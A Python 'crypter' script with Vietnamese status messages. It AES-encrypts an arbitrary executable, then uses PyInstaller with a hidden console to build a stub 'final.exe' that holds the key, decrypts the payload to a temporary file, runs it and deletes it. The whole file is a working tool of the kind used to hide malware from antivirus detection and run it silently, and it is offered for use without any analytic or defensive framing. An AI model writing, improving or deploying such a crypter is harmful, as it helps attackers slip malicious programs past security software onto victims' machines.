import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random
import string

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32)).encode()

def encrypt_file(input_file, output_file, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(input_file, "rb") as f:
        data = f.read()
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    with open(output_file, "wb") as f:
        f.write(cipher.iv)
        f.write(encrypted)
    print(f"✅ Đã mã hóa: {output_file}")
    return key

def create_loader(key, encrypted_file, output_exe):
    loader_code = f'''
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(data, key):
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size)

if __name__ == "__main__":
    with open("{encrypted_file}", "rb") as f:
        data = f.read()
    decrypted = decrypt(data, {key})
    with open("temp.exe", "wb") as f:
        f.write(decrypted)
    os.system("temp.exe")
    os.remove("temp.exe")
'''
    with open("loader.py", "w") as f:
        f.write(loader_code)
    
    os.system(f'pyinstaller --onefile --noconsole --clean loader.py -n {output_exe}')
    print(f"✅ Đã tạo loader: {output_exe}.exe")
    os.remove("loader.py")
    os.remove("loader.spec")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python crypter.py <file.exe>")
        sys.exit(1)
    
    input_exe = sys.argv[1]
    key = generate_key()
    encrypted = input_exe + ".enc"
    encrypt_file(input_exe, encrypted, key)
    create_loader(key, encrypted, "final")
    print("Hoàn tất! File cuối cùng: final.exe")